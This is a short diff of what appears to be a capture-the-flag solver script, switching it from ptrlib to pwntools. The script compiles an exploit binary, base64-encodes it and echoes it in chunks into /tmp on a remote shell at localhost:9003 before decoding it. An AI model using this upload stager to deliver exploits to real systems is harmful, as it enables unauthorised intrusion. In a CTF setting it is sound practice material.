@@ -1,6 +1,5 @@
-import base64
-
-from ptrlib import *
+from ptrlib import bytes2str
+from pwn import *
 
 
 def run(cmd):
@@ -13,12 +12,12 @@ os.system("make")
 with open("exploit", "rb") as f:
     payload = bytes2str(base64.b64encode(f.read()))
 
-r = Socket("localhost", 9003)
+r = remote("localhost", 9003)
 
 r.recv()
 
 run('cd /tmp')
-logger.info("[+] Uploading...")
+log.info("[+] Uploading...")
 for i in range(0, len(payload), 512):
     run('echo "{}" >> b64solve'.format(payload[i:i + 512]))
 run('base64 -d b64solve > solve')
